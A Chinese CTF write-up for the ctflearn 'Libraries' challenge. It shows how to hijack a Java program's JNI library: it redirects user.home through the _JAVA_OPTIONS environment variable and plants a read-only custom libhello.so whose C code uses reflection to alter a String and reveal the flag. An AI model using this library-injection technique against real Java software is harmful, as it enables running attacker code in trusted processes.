---
layout: post
title: Libraries
categories: writeups
tags: pwn
ctfsite: ctflearn.com
challenge_url: https://ctflearn.com/problems/393
challenge_url_comment: 需要注册登录
---

这道题与 Java 及 JNI 有关。登录到主机后，看一下目录：

![dir]({% asset dir.png %})

flag 仍然存放在 flag.txt 中，并且提供了源代码。

{% include writeup_begin.html %}

这道题的主要问题部分在 `Helloworld.java` 中：

{% highlight java linenos %}
public class Helloworld
{
    static
    {
        try
        {
            loadingLibrary();
        }
        catch (Exception e)
        {
            System.err.println("Unable to load library...");
        }
    }

    public static void sayHello(String flag) throws Exception
    {
        String msg = "Hello World from JNI!";
        print(msg);
        if (msg.contains("flag"))
        {
            //What just happened?
            print("What the flag? How did that happen...");
            print("Your flag is: " + flag);
        }
    }

    /**
    * Loads the helloworld library into java.
    */
    private static void loadingLibrary() throws Exception
    {
        Path libFolder = Paths.get(System.getProperty("user.home"), ".helloWorld");

        //Create user folder to copy libraries from jar file.
        if (!Files.exists(libFolder))
            Files.createDirectory(libFolder);

        //Copy library from jar file into user folder
        Path libDest = libFolder.resolve("libhello.so");
        try
        {
        //Copy libhello if not already there.
            Files.copy(ClassLoader.getSystemResourceAsStream("libhello.so"), libDest);
        }
        catch (Exception e)
        {
            //i don't know why this is throwing an error...
            //i think this fixes it...
        }

        //Dynamically link to it.
        System.load(libDest.toString());
    }

    /**
    * This method prints out the message on standard output.
    * @param msg the message to print out.
    */
    private static native void print(String msg);
}
{% endhighlight %}

首先我们关注到 19 行处，如果字符串 `msg` 中包含了“flag”，那么程序就会打印出真正的 flag。`msg` 本身是不包含“flag”的，但这段 Java 程序通过 JNI 调用了一个动态链接库的函数。看来我们需要从这个地方下手。

同时注意到 43 行在拷贝自身资源中的动态链接库文件时，直接 catch 住了所有的异常，这意味着即使复制失败了，程序也会继续执行。再往上看几行，32 行处构造动态链接库目录时使用了 `user.home` 这一系统属性，而这个属性是可以从环境变量中注入的。至此思路大致就清晰了：首先我们需要传入一个自定义的 `user.home` 路径，其中包含了我们自己的 `libhello.so`，进而在 `print` 函数中修改字符串的值。

那么如何设置 `user.home` 呢？首先想到的是在 Java 虚拟机启动时使用命令行参数传入。但是由于在程序入口 `hellotest.cpp` 中固定了传入虚拟机参数，我们无法使用这种方法：

{% highlight cpp linenos %}
    JavaVMOption* options = new JavaVMOption[1];
    options[0].optionString = (char*)"-Djava.class.path=/home/lib/Helloworld.jar";
    vm_args.version = JNI_VERSION_1_6;
    vm_args.nOptions = 1;
    vm_args.options = options;
    vm_args.ignoreUnrecognized = false;
{% endhighlight %}

但除了直接通过命令行参数的方式将属性传给 Java 虚拟机，我们还有另一种传入属性的方法：`_JAVA_OPTIONS` 环境变量。我们只需要在这个环境变量中写好虚拟机的参数，与直接通过命令行参数传入是一样的。因此只需使用

`_JAVA_OPTIONS=-Duser.home=/tmp/test ./hellotest`

启动程序就可以了。此时程序会输出 `Picked up _JAVA_OPTIONS: -Duser.home=/tmp/test`，这就表示我们成功地将 `user.home` 改为 `/tmp/test`了。

下一步就是设计我们自己的 `libhello.so`。首先看一下原版的 `hellolib.c` 的内容：

{% highlight c linenos %}
#include <jni.h>
#include <stdlib.h>
#include <stdio.h>
#include "Helloworld.h"

JNIEXPORT void JNICALL Java_Helloworld_print
  (JNIEnv* env, jclass cls, jstring msg)
{
    const char* str = (*env)->GetStringUTFChars(env, msg, 0);
    printf("%s\n", str);
    if (str)
        (*env)->ReleaseStringUTFChars(env, msg, str);
    fflush(stdout);
}
{% endhighlight %}

OK，就是打印出传入的字符串。下面我们需要通过反射把 `msg` 的内容改变：

{% highlight c linenos %}
JNIEXPORT void JNICALL Java_Helloworld_print
  (JNIEnv* env, jclass cls, jstring msg)
{
    const char* str = (*env)->GetStringUTFChars(env, msg, 0);
    printf("%s\n", str);
    if (str)
        (*env)->ReleaseStringUTFChars(env, msg, str);
    fflush(stdout);

    // 通过反射修改字符串的内容
    jclass c = (*env)->GetObjectClass(env, msg);
    jcharArray flag = (*env)->NewCharArray(env, 4); 
    jchar* bytes = (*env)->GetCharArrayElements(env, flag, 0);
    bytes[0] = 'f';
    bytes[1] = 'l';
    bytes[2] = 'a';
    bytes[3] = 'g';
    (*env)->SetCharArrayRegion(env, flag, 0, 4, bytes);

    // 找到 String 类中的 value 成员
    jfieldID field_id = (*env)->GetFieldID(env, c, "value", "[C");
    (*env)->SetObjectField(env, msg, field_id, flag);
}
{% endhighlight %}

将我们自己编译生成出的 `libhello.so` 放入 `/tmp/test/.helloWorld/` 目录中，并使用 `chmod -wx` 将文件权限设为只读，这样才不会被 `Helloworld.java` 中的 `File.copy` 所覆盖。

执行一下 `_JAVA_OPTIONS=-Duser.home=/tmp/test ./hellotest`，程序就能够成功打印出 flag 了。

{% include writeup_end.html %}
